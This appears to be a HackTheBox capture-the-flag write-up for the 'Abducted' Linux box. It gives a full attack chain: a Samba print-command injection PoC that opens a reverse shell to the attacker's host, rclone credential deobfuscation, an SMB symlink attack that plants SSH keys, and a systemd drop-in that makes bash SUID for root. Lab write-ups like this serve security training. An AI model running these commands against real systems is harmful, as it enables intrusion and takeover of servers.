#  🎯 HackTheBox — Abducted 

 **  Schwierigkeitsgrad:  **  Mittel ·  **  Betriebssystem:  **  Linux ·  **  Kategorie:  **  Samba CVE / Privilegieneskalation 

![Status](https://img.shields.io/badge/Status-Rooted-success)
![Platform](https://img.shields.io/badge/Platform-HackTheBox-red)
![OS](https://img.shields.io/badge/OS-Linux-blue)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange)

*By [@timgad794](https://github.com/timgad794)*

---

## 📋 Overview

**Abducted** simulates a compromised local file and print server in a professional services environment. The box chains a **Samba print-subsystem vulnerability (CVE-2026-4480)**, an **rclone credential leak**, an **SMB symlink attack**, and a **systemd drop-in privilege escalation**.

**Exploit Chain:**
```
Recon (nmap) → SMB enum (HP-Reception printer share)
  → CVE-2026-4480 (Samba %J command injection) → RCE as nobody
  → /opt/offsite-backup/rclone.conf (obfuscated password)
  → rclone reveal → cleartext password
  → SSH as scott → User Flag
  → SMB symlink via "wide links" + "force user = marcus" → SSH as marcus
  → systemd drop-in (smbd.service.d) → SUID bash → root
```

---

## 🖼️ Screenshots

**Initial Nmap scan:**
![Nmap Scan](images/01-nmap.png)

**Reverse shell as nobody:**
![Reverse Shell](images/02-shell.png)

**Root shell with SUID bash:**
![Root Shell](images/03-root.png)

---

## 🔧 Step 1 — Reconnaissance

### 1.1 Hosts entry

```bash
echo "10.129.244.177 abducted.htb" | sudo tee -a /etc/hosts
```

### 1.2 Nmap full scan

```bash
nmap abducted.htb -sCV -A -oN abducted-nmap.txt
```

**Results:**

| Port | Service | Version |
|---|---|---|
| 22/tcp | SSH | OpenSSH 9.6p1 Ubuntu |
| 139/tcp | netbios-ssn | Samba smbd 4 |
| 445/tcp | netbios-ssn | Samba smbd 4 |

**3 open TCP ports** — a Linux file and print server.

---

## 🔧 Step 2 — SMB Enumeration

### 2.1 List shares (guest login)

```bash
smbclient -L //abducted.htb -N
```

**Output:**

```
Sharename       Type      Comment
---------       ----      -------
HP-Reception    Printer   Reception printer
projects        Disk      Hartley Group Project Files
transfer        Disk      Staff file transfer
IPC$            IPC       IPC Service (Hartley Group Document Services)
```

**Key findings:**
- **`HP-Reception`** — printer share with guest access
- **`transfer`** — file transfer share (used later for the symlink attack)

---

## 🔧 Step 3 — Initial Access: CVE-2026-4480

### 3.1 The vulnerability

Samba passes the client-controlled print job description to the `print command` via the **`%J`** placeholder without escaping shell metacharacters. This allows unauthenticated attackers to execute arbitrary commands as the print service account.

### 3.2 Clone the PoC

```bash
git clone https://github.com/TheCyberGeek/CVE-2026-4480-PoC.git
cd CVE-2026-4480-PoC
cat exploit.py | head -30
```

### 3.3 Start listener

**Terminal A:**
```bash
nc -lvnp 8443
```

### 3.4 Run the exploit

**Terminal B:**
```bash
cd ~/CVE-2026-4480-PoC
python3 exploit.py 10.129.244.177 10.10.16.96 8443 -P HP-Reception
```

**Expected output:**
```
[*] target   : 10.129.244.177 (\\10.129.244.177\HP-Reception)
[*] callback : 10.10.16.96:8443
[+] print job submitted -- check your listener
```

**Terminal A:**
```
Connection received on 10.129.244.177 ...
nobody@abducted:/var/spool/samba$
```

We now have **RCE as `nobody`** (uid=65534).

---

## 🔧 Step 4 — Post-Exploitation: rclone Credentials

### 4.1 Recon in the shell

```bash
id
# uid=65534(nobody) gid=65534(nogroup)

cat /etc/passwd | grep -E "bash|sh$"
# → root, scott, marcus
```

### 4.2 Find the rclone config

```bash
find / -type f -name "rclone.conf" 2>/dev/null
# → /opt/offsite-backup/rclone.conf

cat /opt/offsite-backup/rclone.conf
```

**Output:**
```ini
[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
shell_type = unix
```

### 4.3 Deobfuscate the password

rclone uses **reversible base64 obfuscation**. Use rclone itself:

```bash
# On Kali (not inside the shell)
sudo apt install -y rclone
rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
```

**Output:**
```
iXzvcib3SrpZ
```

---

## 🔧 Step 5 — Lateral Movement: SSH as `scott`

### 5.1 Password reuse

```bash
ssh scott@abducted.htb
# Password: iXzvcib3SrpZ
```

**Login successful!**

```bash
id
# uid=1000(scott) gid=1001(scott)

cat ~/user.txt
# 🟢 User Flag
```

---

## 🔧 Step 6 — Lateral Movement: `scott` → `marcus`

### 6.1 The misconfiguration

The `transfer` share in `/etc/samba/shares.conf` contains:

```ini
[transfer]
    path = /srv/transfer
    force user = marcus
    wide links = yes
    ...
```

**Meaning:**
- **`force user = marcus`** — every file operation runs as `marcus`
- **`wide links = yes`** — symlinks may point outside the share directory

### 6.2 Symlink attack

**As `scott` in the SSH session:**

```bash
# SSH keypair in scott's home (not /tmp — nobody owns files there)
ssh-keygen -q -t ed25519 -N '' -f ~/k

# Symlink to marcus's home
ln -s /home/marcus /srv/transfer/keys

# Upload public key — ABSOLUTE paths required (smbclient does not expand tilde)
smbclient //127.0.0.1/transfer -U 'scott%iXzvcib3SrpZ' \
  -c 'put /home/scott/k.pub keys/.ssh/authorized_keys'
```

**Verification:**
```bash
smbclient //127.0.0.1/transfer -U 'scott%iXzvcib3SrpZ' \
  -c 'get keys/.ssh/authorized_keys /tmp/ak'
diff /tmp/ak /home/scott/k.pub && echo "KEYS MATCH"
```

### 6.3 SSH as marcus

```bash
ssh -i /home/scott/k -o StrictHostKeyChecking=no marcus@localhost
id
# → uid=1001(marcus) groups=1002(marcus),1000(operators)
```

**Important:** `operators` is the key group for escalation.

---

## 🔧 Step 7 — Privilege Escalation: `marcus` → `root`

### 7.1 The misconfiguration

```bash
find / -group operators 2>/dev/null
# → /etc/systemd/system/smbd.service.d

ls -ld /etc/systemd/system/smbd.service.d/
# drwxrws--- 2 root operators
```

The `operators` group has **write access** to the systemd drop-in directory of the `smbd` service.

### 7.2 Drop-in hijack

**As `marcus`:**

```bash
cat > /etc/systemd/system/smbd.service.d/daffy.conf << 'EOF'
[Service]
ExecStartPre=/bin/bash -c 'chmod +s /bin/bash'
EOF
```

**Reload + restart** (polkit allows `operators` to run `daemon-reload` without password):

```bash
systemctl daemon-reload
systemctl restart smbd
```

### 7.3 Exploit SUID bash

```bash
/bin/bash -p
id
# → euid=0(root)

cat /root/root.txt
# 🔴 Root Flag
```

**Box fully compromised.** ✅

---

## 🏆 Result

| Flag | Path |
|---|---|
| 🟢 User | `/home/scott/user.txt` |
| 🔴 Root | `/root/root.txt` |

---

## 📚 Key Concepts

| Concept | Application |
|---|---|
| **CVE-2026-4480** | Samba `%J` print-command injection → RCE |
| **rclone Deobfuscation** | `rclone reveal` for reversible base64 obfuscation |
| **Password Reuse** | `svc-backup` password works for `scott` too |
| **SMB Symlink Attack** | `wide links = yes` + `force user = marcus` |
| **systemd Drop-in Hijack** | Write access to `smbd.service.d` → `ExecStartPre` |
| **SUID Bash** | `chmod +s /bin/bash` + `/bin/bash -p` → euid=0 |
| **polkit Bypass** | `operators` group may `daemon-reload` without auth |

---

## 🧰 Tools & References

- [CVE-2026-4480 PoC (TheCyberGeek)](https://github.com/TheCyberGeek/CVE-2026-4480-PoC)
- [rclone Reveal](https://rclone.org/commands/rclone_reveal/)
- [Samba wide links](https://www.samba.org/samba/docs/current/man-html/smb.conf.5.html)
- [systemd Drop-in](https://www.freedesktop.org/software/systemd/man/systemd.unit.html)
- [Nmap](https://nmap.org/)

---

## ⚠️ Disclaimer

This writeup documents an authorized penetration test on the HackTheBox platform only. All credentials and flags are part of the lab environment and **not production systems**.

<div align="center">

**⭐ If this writeup helped you, feel free to leave a star!**

</div>
